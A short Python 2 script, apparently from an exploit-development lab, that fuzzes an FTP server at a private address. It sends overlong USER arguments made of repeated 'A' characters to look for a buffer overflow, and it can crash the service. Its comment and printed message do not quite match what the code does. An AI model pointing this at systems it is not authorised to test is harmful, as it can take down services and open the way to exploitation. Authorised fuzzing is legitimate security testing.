#!/usr/bin/python

import socket
import time


# Create an array of buffers, from 1 to 5900, with increments of 200
buffer=["A"]
counter = 100
while len(buffer) <= 20:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s bytes" %len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.0.107', 21))
    s.recv(1024)
    s.send('USER ' + string + '\r\n')
    s.send('QUIT\r\n')
    print "sleeping for 10 seconds"
    time.sleep(10)
    print "waking up!"
    s.close()

